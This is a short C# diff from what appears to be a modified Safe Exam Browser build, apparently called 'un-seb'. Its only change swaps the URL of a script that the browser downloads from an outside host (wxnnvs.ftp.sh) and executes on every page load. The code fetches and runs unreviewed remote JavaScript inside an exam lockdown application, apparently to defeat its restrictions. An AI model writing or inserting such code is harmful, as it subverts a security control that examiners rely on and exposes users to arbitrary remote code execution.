@@ -200,7 +200,7 @@ namespace SafeExamBrowser.Browser
 
 			using (var client = new System.Net.WebClient())
 			{
-				var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script_340.js");
+				var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script.js");
 				(control as IWebBrowser)?.ExecuteScriptAsyncWhenPageLoaded(the_script);
 			}
 		}
